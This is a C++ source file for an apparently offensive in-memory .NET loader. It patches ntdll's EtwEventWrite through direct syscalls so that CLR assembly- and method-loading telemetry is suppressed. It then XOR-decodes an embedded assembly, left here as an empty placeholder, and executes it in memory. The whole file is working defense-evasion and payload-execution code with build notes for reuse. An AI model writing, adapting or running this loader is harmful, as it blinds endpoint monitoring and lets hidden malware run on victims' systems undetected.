//Reference:https://github.com/etormadiv/HostingCLR
//Add a function of changing cElement to the number of Main arguments.(https://github.com/etormadiv/HostingCLR/blob/master/HostingCLR/HostingCLR.cpp#L218)
//Support passing multiple parameters to CLR.
//All patching EtwEventWrite codes are from https://github.com/outflanknl/TamperETW/
//You need to add Syscalls.asm(https://github.com/outflanknl/TamperETW/blob/master/TamperETW/UnmanagedCLR/Syscalls.asm) when building.

#include "stdafx.h"
#include <stdio.h>
#include <tchar.h>
#include <metahost.h>
#include <evntprov.h>
#pragma comment(lib, "MSCorEE.lib")

//change this
#define mscorlibPath "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorlib.tlb"
//change this
#define runtimeVersion L"v4.0.30319"

#import mscorlibPath raw_interfaces_only \
    high_property_prefixes("_get","_put","_putref")		\
    rename("ReportEvent", "InteropServices_ReportEvent")
using namespace mscorlib;


//You can get the rawData of file by HxD(https://mh-nexus.de/en/hxd/).
unsigned char rawData[8192] = {
	//...
};



#define STATUS_SUCCESS 0
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef const UNICODE_STRING* PCUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
	ULONG Length;
	BOOLEAN Initialized;
	HANDLE SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
	BOOLEAN ShutdownInProgress;
	HANDLE ShutdownThreadId;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	BYTE           Reserved1[16];
	PVOID          Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _API_SET_NAMESPACE {
	ULONG Version;
	ULONG Size;
	ULONG Flags;
	ULONG Count;
	ULONG EntryOffset;
	ULONG HashOffset;
	ULONG HashFactor;
} API_SET_NAMESPACE, *PAPI_SET_NAMESPACE;

// Partial PEB
typedef struct _PEB {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
		};
	};
	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PPEB_LDR_DATA Ldr;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PRTL_CRITICAL_SECTION FastPebLock;
	PVOID IFEOKey;
	PSLIST_HEADER AtlThunkSListPtr;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ProcessPreviouslyThrottled : 1;
			ULONG ProcessCurrentlyThrottled : 1;
			ULONG ProcessImagesHotPatched : 1;
			ULONG ReservedBits0 : 24;
		};
	};
	union
	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	};
	ULONG SystemReserved;
	ULONG AtlThunkSListPtr32;
	PAPI_SET_NAMESPACE ApiSetMap;
	ULONG TlsExpansionCounter;
	PVOID TlsBitmap;
	ULONG TlsBitmapBits[2];
	PVOID ReadOnlySharedMemoryBase;
	PVOID SharedData;
	PVOID *ReadOnlyStaticServerData;
	PVOID AnsiCodePageData;
	PVOID OemCodePageData;
	PVOID UnicodeCaseTableData;
	ULONG NumberOfProcessors;
	ULONG NtGlobalFlag;
	ULARGE_INTEGER CriticalSectionTimeout;
	SIZE_T HeapSegmentReserve;
	SIZE_T HeapSegmentCommit;
	SIZE_T HeapDeCommitTotalFreeThreshold;
	SIZE_T HeapDeCommitFreeBlockThreshold;
	ULONG NumberOfHeaps;
	ULONG MaximumNumberOfHeaps;
	PVOID *ProcessHeaps;
	PVOID GdiSharedHandleTable;
	PVOID ProcessStarterHelper;
	ULONG GdiDCAttributeList;
	PRTL_CRITICAL_SECTION LoaderLock;
	ULONG OSMajorVersion;
	ULONG OSMinorVersion;
	USHORT OSBuildNumber;
} PEB, *PPEB;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	union
	{
		LIST_ENTRY InInitializationOrderLinks;
		LIST_ENTRY InProgressLinks;
	};
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	WORD LoadCount;
	WORD TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _TEB {
	PVOID Reserved1[12];
	PPEB  ProcessEnvironmentBlock;
	PVOID Reserved2[399];
	BYTE  Reserved3[1952];
	PVOID TlsSlots[64];
	BYTE  Reserved4[8];
	PVOID Reserved5[26];
	PVOID ReservedForOle;
	PVOID Reserved6[4];
	PVOID TlsExpansionSlots;
} TEB, *PTEB;

typedef ULONG(NTAPI *_EtwEventWrite)(
	__in REGHANDLE RegHandle,
	__in PCEVENT_DESCRIPTOR EventDescriptor,
	__in ULONG UserDataCount,
	__in_ecount_opt(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData
	);

typedef ULONG(NTAPI *_EtwEventWriteFull)(
	__in REGHANDLE RegHandle,
	__in PCEVENT_DESCRIPTOR EventDescriptor,
	__in USHORT EventProperty,
	__in_opt LPCGUID ActivityId,
	__in_opt LPCGUID RelatedActivityId,
	__in ULONG UserDataCount,
	__in_ecount_opt(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData
	);

// Windows 7 SP1 / Server 2008 R2 specific Syscalls
EXTERN_C NTSTATUS ZwProtectVirtualMemory7SP1(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
EXTERN_C NTSTATUS ZwReadVirtualMemory7SP1(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);
EXTERN_C NTSTATUS ZwWriteVirtualMemory7SP1(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

// Windows 8 / Server 2012 specific Syscalls
EXTERN_C NTSTATUS ZwProtectVirtualMemory80(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
EXTERN_C NTSTATUS ZwReadVirtualMemory80(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);
EXTERN_C NTSTATUS ZwWriteVirtualMemory80(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);


// Windows 8.1 / Server 2012 R2 specific Syscalls
EXTERN_C NTSTATUS ZwProtectVirtualMemory81(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
EXTERN_C NTSTATUS ZwReadVirtualMemory81(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);
EXTERN_C NTSTATUS ZwWriteVirtualMemory81(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);


// Windows 10 / Server 2016 specific Syscalls
EXTERN_C NTSTATUS ZwProtectVirtualMemory10(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
EXTERN_C NTSTATUS ZwReadVirtualMemory10(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);
EXTERN_C NTSTATUS ZwWriteVirtualMemory10(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

NTSTATUS(*ZwProtectVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN PVOID* BaseAddress,
	IN SIZE_T* NumberOfBytesToProtect,
	IN ULONG NewAccessProtection,
	OUT PULONG OldAccessProtection
	);

NTSTATUS(*ZwReadVirtualMemory)(
	HANDLE hProcess,
	PVOID lpBaseAddress,
	PVOID lpBuffer,
	SIZE_T NumberOfBytesToRead,
	PSIZE_T NumberOfBytesRead
	);

NTSTATUS(*ZwWriteVirtualMemory)(
	HANDLE hProcess,
	PVOID lpBaseAddress,
	PVOID lpBuffer,
	SIZE_T NumberOfBytesToWrite,
	PSIZE_T NumberOfBytesWritten
	);

#define ModuleLoad_V2 152
#define AssemblyDCStart_V1 155
#define MethodLoadVerbose_V1 143
#define MethodJittingStarted 145
#define ILStubGenerated 88

UCHAR uHook[] = {
	0x48, 0xb8, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xFF, 0xE0
};

ULONG NTAPI MyEtwEventWrite(
	__in REGHANDLE RegHandle,
	__in PCEVENT_DESCRIPTOR EventDescriptor,
	__in ULONG UserDataCount,
	__in_ecount_opt(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData)
{
	ULONG uResult = 0;

	_EtwEventWriteFull EtwEventWriteFull = (_EtwEventWriteFull)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "EtwEventWriteFull");
	if (EtwEventWriteFull == NULL) {
		return 1;
	}

	switch (EventDescriptor->Id) {
	case AssemblyDCStart_V1:
		// Block CLR assembly loading events.
		break;
	case MethodLoadVerbose_V1:
		// Block CLR method loading events.
		break;
	case ILStubGenerated:
		// Block MSIL stub generation events.
		break;
	default:
		// Forward all other ETW events using EtwEventWriteFull.
		uResult = EtwEventWriteFull(RegHandle, EventDescriptor, 0, NULL, NULL, UserDataCount, UserData);
	}

	return uResult;
}

BOOL InlineHook(LPVOID lpFuncAddress) {
	PNT_TIB pTIB = NULL;
	PTEB pTEB = NULL;
	PPEB pPEB = NULL;

	// Get pointer to the TEB
	pTIB = (PNT_TIB)__readgsqword(0x30);
	pTEB = (PTEB)pTIB->Self;

	// Get pointer to the PEB
	pPEB = (PPEB)pTEB->ProcessEnvironmentBlock;
	if (pPEB == NULL) {
		return FALSE;
	}

	if (pPEB->OSMajorVersion == 10 && pPEB->OSMinorVersion == 0) {
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
	}
	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 1 && pPEB->OSBuildNumber == 7601) {
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory7SP1;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory7SP1;
	}
	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 2) {
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory80;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory80;
	}
	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 3) {
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory81;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory81;
	}
	else {
		return FALSE;
	}

	LPVOID lpBaseAddress = lpFuncAddress;
	ULONG OldProtection, NewProtection;
	SIZE_T uSize = sizeof(uHook);
	NTSTATUS status = ZwProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	status = ZwWriteVirtualMemory(NtCurrentProcess(), lpFuncAddress, (PVOID)uHook, sizeof(uHook), NULL);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	status = ZwProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, OldProtection, &NewProtection);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	return TRUE;
}


int _tmain(int argc, _TCHAR* argv[])
{
	BOOL bResult = FALSE;
	IEnumUnknown *installedRuntimes = NULL;
	ICLRRuntimeInfo *runtimeInfo = NULL;
	ICLRRuntimeHost *runtimeHost = NULL;
	ULONG fetched = 0;
	DWORD pReturnValue = 0;
	LPWSTR lpwMessage = NULL;
	wprintf(L"[+] Patching EtwEventWrite\n");
	LPVOID lpFuncAddress = GetProcAddress(LoadLibrary(L"ntdll.dll"), "EtwEventWrite");

	// Add address of hook function to patch.
	*(DWORD64*)&uHook[2] = (DWORD64)MyEtwEventWrite;

	if (!InlineHook(lpFuncAddress)) {
		wprintf(L"[!] Error: Patching EtwEventWrite failed...\n");
	}

	wprintf(L"[+] Now Loading CLR...\n");



	
	for (int i = 0; i < sizeof(rawData); i++)
	{
		rawData[i] = rawData[i] ^ 0x01;
	}


	ICLRMetaHost* pMetaHost = NULL;
	HRESULT hr;
	/* Get ICLRMetaHost instance */
	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&pMetaHost);
	if (FAILED(hr))
	{
		printf("[!] CLRCreateInstance(...) failed\n");
		return -1;
	}
	printf("[+] CLRCreateInstance(...) succeeded\n");

	ICLRRuntimeInfo* pRuntimeInfo = NULL;
	/* Get ICLRRuntimeInfo instance */
	hr = pMetaHost->GetRuntime(runtimeVersion, IID_ICLRRuntimeInfo, (VOID**)&pRuntimeInfo);
	if (FAILED(hr))
	{
		printf("[!] pMetaHost->GetRuntime(...) failed\n");
		return -1;
	}
	printf("[+] pMetaHost->GetRuntime(...) succeeded\n");

	BOOL bLoadable;
	/* Check if the specified runtime can be loaded */
	hr = pRuntimeInfo->IsLoadable(&bLoadable);
	if (FAILED(hr) || !bLoadable)
	{
		printf("[!] pRuntimeInfo->IsLoadable(...) failed\n");
		return -1;
	}
	printf("[+] pRuntimeInfo->IsLoadable(...) succeeded\n");

	ICorRuntimeHost* pRuntimeHost = NULL;
	/* Get ICorRuntimeHost instance */
	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&pRuntimeHost);
	if (FAILED(hr))
	{
		printf("[!] pRuntimeInfo->GetInterface(...) failed\n");
		return -1;
	}
	printf("[+] pRuntimeInfo->GetInterface(...) succeeded\n");

	/* Start the CLR */
	hr = pRuntimeHost->Start();
	if (FAILED(hr))
	{
		printf("[!] pRuntimeHost->Start() failed\n");
		return -1;
	}
	printf("[+] pRuntimeHost->Start() succeeded\n");

	IUnknownPtr pAppDomainThunk = NULL;
	hr = pRuntimeHost->GetDefaultDomain(&pAppDomainThunk);
	if (FAILED(hr))
	{
		printf("[!] pRuntimeHost->GetDefaultDomain(...) failed\n");
		return -1;
	}
	printf("[+] pRuntimeHost->GetDefaultDomain(...) succeeded\n");

	_AppDomainPtr pDefaultAppDomain = NULL;
	/* Equivalent of System.AppDomain.CurrentDomain in C# */
	hr = pAppDomainThunk->QueryInterface(__uuidof(_AppDomain), (VOID**)&pDefaultAppDomain);
	if (FAILED(hr))
	{
		printf("[!] pAppDomainThunk->QueryInterface(...) failed\n");
		return -1;
	}
	printf("[+] pAppDomainThunk->QueryInterface(...) succeeded\n");

	_AssemblyPtr pAssembly = NULL;
	SAFEARRAYBOUND rgsabound[1];
	rgsabound[0].cElements = sizeof(rawData);
	rgsabound[0].lLbound = 0;
	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
	void* pvData = NULL;
	hr = SafeArrayAccessData(pSafeArray, &pvData);
	if (FAILED(hr))
	{
		printf("[!] SafeArrayAccessData(...) failed\n");
		return -1;
	}
	printf("[+] SafeArrayAccessData(...) succeeded\n");

	memcpy(pvData, rawData, sizeof(rawData));
	hr = SafeArrayUnaccessData(pSafeArray);
	if (FAILED(hr))
	{
		printf("[!] SafeArrayUnaccessData(...) failed\n");
		return -1;
	}
	printf("[+] SafeArrayUnaccessData(...) succeeded\n");

	/* Equivalent of System.AppDomain.CurrentDomain.Load(byte[] rawAssembly) */
	hr = pDefaultAppDomain->Load_3(pSafeArray, &pAssembly);
	if (FAILED(hr))
	{
		printf("[!] pDefaultAppDomain->Load_3(...) failed\n");
		return -1;
	}
	printf("[+] pDefaultAppDomain->Load_3(...) succeeded\n");

	_MethodInfoPtr pMethodInfo = NULL;
	/* Assembly.EntryPoint Property */
	hr = pAssembly->get_EntryPoint(&pMethodInfo);
	if (FAILED(hr))
	{
		printf("[!] pAssembly->get_EntryPoint(...) failed\n");
		return -1;
	}
	printf("[+] pAssembly->get_EntryPoint(...) succeeded\n");

	VARIANT retVal;
	ZeroMemory(&retVal, sizeof(VARIANT));
	VARIANT obj;
	ZeroMemory(&obj, sizeof(VARIANT));
	obj.vt = VT_NULL;
	VARIANT vtPsa;
	vtPsa.vt = (VT_ARRAY | VT_BSTR);
	SAFEARRAY *args = SafeArrayCreateVector(VT_VARIANT, 0, 1);
	//Managing parameters
	if (argv[1] != '\x00')
	{
		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, argc); // create an array of strings
		for (long i = 0; i < argc; i++)
		{
			SafeArrayPutElement(vtPsa.parray, &i, SysAllocString(argv[i]));
		}

		long idx[1] = { 0 };
		SafeArrayPutElement(args, idx, &vtPsa);
	}
	else
	{
		//if no parameters set cEleemnt to 0
		args = SafeArrayCreateVector(VT_VARIANT, 0, 0);
	}

	hr = pMethodInfo->Invoke_3(obj, args, &retVal);
	if (FAILED(hr))
	{
		printf("[!] pMethodInfo->Invoke_3(...) failed, hr = %X\n", hr);
		return -1;
	}
	printf("[+] pMethodInfo->Invoke_3(...) succeeded\n");

	return 0;
}
